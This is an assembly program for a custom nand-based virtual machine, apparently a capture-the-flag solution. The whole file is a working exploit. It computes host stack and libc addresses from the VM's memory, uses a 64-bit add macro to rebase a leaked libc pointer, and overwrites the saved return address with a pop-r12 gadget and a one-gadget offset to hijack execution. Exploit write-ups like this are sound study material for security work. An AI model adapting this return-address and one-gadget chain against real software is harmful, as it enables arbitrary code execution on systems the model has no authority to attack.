# make mask to deal with signedness
lw r7, r0, almost_mask
add r7, r7
lw r1, r0, one
add r7, r1

#r7 is the mask register 
#r1 is the return register
#r0 is the zero register

# craft 32795 address of return address
lw r1, r0, return_addr
nand r1, r7
nand r1, r1

# craft address of leak 
lw r2, r0, libc 
nand r2, r7
nand r2, r2

# prepare for add64 macro
lw r3, r0, neg243 
lw r6, r0, one 
lw r5, r0, sumbuf 
sw r5, r0, A_ptr

sw r3, r5, r0
add r5, r6
sw r7, r5, r0
add r5, r6
sw r7, r5, r0
add r5, r6
sw r7, r5, r0

sw r2, r0, B_ptr
sw r1, r0, Sum_ptr

$add64

# move zero into the address after the return adddress
lw r1, r0, return_addr
nand r1, r7
nand r1, r1
lw r6, r0, one 
add r1, r6
add r1, r6
add r1, r6
add r1, r6

# store zeroes
sw r0, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6

# now we need to write libc start main to the next address as well
lw r2, r0, return_addr
nand r2, r7
nand r2, r2
lw r3, r2, r0
sw r3, r1, r0
add r1, r6
add r2, r6
lw r3, r2, r0
sw r3, r1, r0
add r1, r6
add r2, r6
lw r3, r2, r0
sw r3, r1, r0
add r1, r6
add r2, r6
lw r3, r2, r0
sw r3, r1, r0
add r1, r6
add r2, r6

# add to return addr to make it pop 
lw r1, r0, return_addr
nand r1, r7
nand r1, r1
sw r1, r0, A_ptr
sw r1, r0, Sum_ptr

lw r1, r0, sumbuf
nand r1, r7
nand r1, r1
sw r1, r0, B_ptr

lw r6, r0, one
lw r2, r0, popr12
sw r2, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6
sw r0, r1, r0

$add64

# add to 3rd addr of stack to trigger onegadget 
lw r1, r0, return_addr
nand r1, r7
nand r1, r1
lw r6, r0, one
add r1, r6
add r1, r6
add r1, r6
add r1, r6
add r1, r6
add r1, r6
add r1, r6
add r1, r6
sw r1, r0, A_ptr
sw r1, r0, Sum_ptr 

lw r1, r0, sumbuf
sw r1, r0, B_ptr
lw r2, r0, onegadget0
sw r2, r1, r0
add r1, r6
lw r2, r0 onegadget1
sw r2, r1, r0
add r1, r6
sw r0, r1, r0
add r1, r6
sw r0, r1, r0

$add64

halt

.buf0 0x0000
.buf1 0x0000
.buf2 0x0000
.buf3 0x0000
.return_addr 0x801B
.libc 0x802B
.one 0x0001
.zero 0x0000
.almost_mask 0x7fff
.almost_bitmask 0x4000
.A 0x0000
.B 0x0000 
.Sum 0x0000 
.carrystore1 0x0000
.carrystore2 0x0000
.carrystore3 0x0000
.A_ptr 0x0000 
.B_ptr 0x0000 
.Sum_ptr 0x0000
.neg243 0xFF0D
.sumbuf 0x0001
.popr12 0xB779
.onegadget0 0xFB6E
.onegadget1 0x000B
